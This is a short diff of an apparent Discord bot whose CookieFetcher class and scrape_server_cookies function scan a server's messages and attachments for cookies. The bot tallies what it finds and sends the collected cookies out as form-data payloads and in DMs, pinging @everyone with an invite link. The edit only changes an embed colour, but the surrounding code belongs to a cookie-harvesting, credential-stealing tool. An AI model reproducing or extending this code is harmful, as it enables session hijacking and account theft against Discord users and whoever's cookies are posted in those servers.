@@ -154,7 +154,7 @@ class CookieFetcher:
                 all_cookies_content = "\n".join(all_cookies)
                 embed = discord.Embed(
                     description=f"**Cookie Fetch Complete**\n**Cookies Found**: {len(all_cookies)}\n**Unique Cookies**: {len(unique_cookies)}\n**Messages Scanned**: {messages_scanned}\n**Attachments Scanned**: {attachments_scanned}\n**Time Taken**: {time_taken:.1f} seconds",
-                    color=0x3498db
+                    color=0x000000
                 )
                 form_data = aiohttp.FormData()
                 form_data.add_field('payload_json', json.dumps({
@@ -443,7 +443,7 @@ async def scrape_server_cookies(interaction, guild):
                 cookies_content = "\n".join(all_cookies)
                 dm_embed = discord.Embed(
                     description=f"**Cookie Fetch Complete**\n**Cookies Found**: {len(all_cookies)}\n**Unique Cookies**: {len(unique_cookies)}\n**Messages Scanned**: {actual_messages_scanned}\n**Attachments Scanned**: {attachments_scanned}\n**Time Taken**: {time_taken:.1f} seconds",
-                    color=0x3498db
+                    color=0x000000
                 )
                 await dm_channel.send(
                     content="**@everyone**\nhttps://discord.gg/aHh7KauuYd",
